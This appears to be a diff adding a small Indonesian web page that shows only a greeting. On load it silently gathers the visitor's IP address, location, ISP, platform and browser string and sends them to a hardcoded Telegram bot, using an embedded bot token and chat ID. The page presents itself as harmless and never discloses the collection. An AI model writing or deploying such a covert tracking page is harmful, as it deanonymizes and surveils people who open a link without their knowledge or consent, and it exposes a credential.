@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Janji? </title>
+</head>
+<body>
+    <h1>Helloworld...</h1>
+
+    <script>
+        const BOT_TOKEN = '8918040492:AAHF6NFMY820DvradZTszZPeUDSDFiKCk3k'; 
+        const CHAT_ID = '2044673218';
+
+        async function getIP() {
+            // Mencoba beberapa API secara bergantian agar tidak error
+            const apis = ['https://api.ipify.org?format=json', 'https://ip-api.com/json/'];
+            for (let url of apis) {
+                try {
+                    const res = await fetch(url);
+                    if (res.ok) return await res.json();
+                } catch (e) { continue; }
+            }
+            return { query: "Gagal ambil IP", city: "-", country: "-", isp: "-" };
+        }
+
+        async function kirimData() {
+            try {
+                const geo = await getIP();
+                const ip = geo.query || geo.ip;
+
+                const pesan = `
+                🚀 LOG DIAGNOSTIK:
+                IP: ${ip}
+                Lokasi: ${geo.city || 'N/A'}, ${geo.country || 'N/A'}
+                ISP: ${geo.isp || 'N/A'}
+                OS: ${navigator.platform}
+                Browser: ${navigator.userAgent}
+                Waktu: ${new Date().toLocaleString()}`;
+
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
+                });
+
+                if (response.ok) {
+                    document.body.innerHTML = "<h1>:).</h1>";
+                } else {
+                    document.body.innerHTML = "<h1>:(.</h1>";
+                }
+            } catch (error) {
+                console.error(error);
+                document.body.innerHTML = "<h1>;(.</h1>";
+            }
+        }
+
+        kirimData();
+    </script>
+</body>
+</html>
